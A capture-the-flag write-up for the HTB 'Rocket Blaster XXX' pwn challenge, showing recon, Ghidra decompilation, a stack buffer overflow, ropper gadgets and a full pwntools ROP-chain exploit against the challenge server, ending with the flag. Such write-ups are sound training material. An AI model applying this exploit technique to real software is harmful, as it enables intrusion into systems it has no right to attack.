# Rocket Blaster XXX

## Description

> Prepare for the ultimate showdown! Load your weapons, gear up for battle, and dive into the epic fray—let the fight commence!
>
> [Attached file](./challenge)

Tags: _Pwn_ \
Difficulty: _easy_ \
Points: _300_

## Recognition phase

Run usual recognition commands:

```
$ file rocket_blaster_xxx 
rocket_blaster_xxx: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=9e28ecfbaaa7523f12988b4e40c003ec28baf849, for GNU/Linux 3.2.0, not stripped
```


```
$ checksec rocket_blaster_xxx                                                  
[*] '/home/jovenoven/Downloads/ctf/cyberApocalypse2024_HTB/pwn/rocket_blaster_xxx/rocket_blaster_xxx'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

Without canaries and PIE disabled we can potentially do a simple `BOF` and call functions from within the binary without needing to leak them dynamically.

```c
/* decompilation from Ghidra */
undefined8 main(void)

{
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  banner();
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  fflush(stdout);
  printf(
        "\nPrepare for trouble and make it double, or triple..\n\nYou need to place the ammo in the right place to load the Rocket Blaster XXX!\n\n>> "
        );
  fflush(stdout);
  read(0,&local_28,0x66);
  puts("\nPreparing beta testing..");
  return 0;
}
```

```c
/* decompilation from Ghidra */
void fill_ammo(long param_1,long param_2,long param_3)

{
  ssize_t sVar1;
  char local_d;
  int local_c;
  
  local_c = open("./flag.txt",0);
  if (local_c < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_1 != 0xdeadbeef) {
    printf("%s[x] [-] [-]\n\n%sPlacement 1: %sInvalid!\n\nAborting..\n",&DAT_00402010,&DAT_00402008,
           &DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_2 != 0xdeadbabe) {
    printf(&DAT_004020c0,&DAT_004020b6,&DAT_00402010,&DAT_00402008,&DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(2);
  }
  if (param_3 != 0xdead1337) {
    printf(&DAT_00402100,&DAT_004020b6,&DAT_00402010,&DAT_00402008,&DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(3);
  }
  printf(&DAT_00402140,&DAT_004020b6);
  fflush(stdin);
  fflush(stdout);
  while( true ) {
    sVar1 = read(local_c,&local_d,1);
    if (sVar1 < 1) break;
    fputc((int)local_d,stdout);
  }
  close(local_c);
  fflush(stdin);
  fflush(stdout);
  return;
}
```

Main does nothing but reading up to ``0x66`` bytes of data from the user input and stores the value in an 8 byte variable `local_28`. In the other hand, we have a hidden function that prints the flag if given the arguments ``0xdeadbeef``, ``0xdeadbabe``, ``0xdead1337`` in that order.

## Finding the bug

We clearly have a buffer overflow bug with offset of 40 bytes

```
$ ./rocket_blaster_xxx 

...   
                                                                                 
>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA          
                                                                                 
Preparing beta testing..                                                         
Segmentation fault
```

## Exploitation phase

We can leverage the buffer overflow bug to create a ``Rop chain`` in order to set the parameters needed to execute `fill_ammo()` successfully. I used `ropper` to find them.


```
$ ropper --file rocket_blaster_xxx                                             
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%

Gadgets

...
 
0x000000000040159f: pop rdi; ret; 
0x000000000040159b: pop rdx; ret;
...
0x000000000040159d: pop rsi; ret;
...
0x000000000040101a: ret;
=======

```

With this gadgets at hand we can write our final exploit, the registers `RDI`, `RSI` and `RDX` will be used to set the first, second, and third parameters respectively, those registers are commonly use for that purpose. Before popping the parameters from the stack to the registers, it is necessary to write a `ret` gadget to avoid stack alignment issues. Finally, set the `fill_ammo` function at the end of the `ROP chain` to execute it and get the flag. Here is my exploit script:

```Python
#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("rocket_blaster_xxx")

# Defining the GDB script that will be used when running the binary
gs = '''
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        return remote("83.136.251.235", 57283)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

io = start()

#============================================================
#                    EXPLOIT GOES HERE
#============================================================

pop_rdi = 0x40159f
pop_rdx = 0x40159b
pop_rsi = 0x40159d
ret = 0x40101a;

io.sendlineafter(b">> ", b"A"*40 + p64(ret) \
                         + p64(pop_rdi) + p64(0xdeadbeef) \
                         + p64(pop_rsi) + p64(0xdeadbabe) \
                         + p64(pop_rdx) + p64(0xdead1337) \
                         + p64(elf.sym.fill_ammo))

#============================================================

# Interact with the process
io.interactive()
```
```
./xpl.py REMOTE

...

Preparing beta testing..
[✓] [✓] [✓]                                                                      
                                                                                 
All Placements are set correctly!                                                
                                                                                 
Ready to launch at: HTB{b00m_b00m_r0ck3t_2_th3_m00n}
```
\
Flag `HTB{b00m_b00m_r0ck3t_2_th3_m00n}`
